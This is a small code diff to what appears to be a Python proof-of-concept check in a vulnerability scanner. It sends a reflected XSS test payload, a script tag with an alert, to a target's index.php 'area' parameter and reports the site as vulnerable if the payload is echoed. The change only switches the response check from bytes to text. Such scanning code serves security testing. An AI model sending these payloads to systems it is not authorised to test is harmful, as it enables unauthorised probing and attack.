@@ -51,7 +51,7 @@ class Poc(ABPoc):
             payload = '/index.php?area=<script>alert(/Sebug23333/)</script>'
             vul_url = arg + payload
             res = requests.get(vul_url, timeout=10)
-            if type == 'xss' and '<script>alert(/Sebug23333/)</script>' in res.content:
+            if type == 'xss' and '<script>alert(/Sebug23333/)</script>' in res.text:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
 
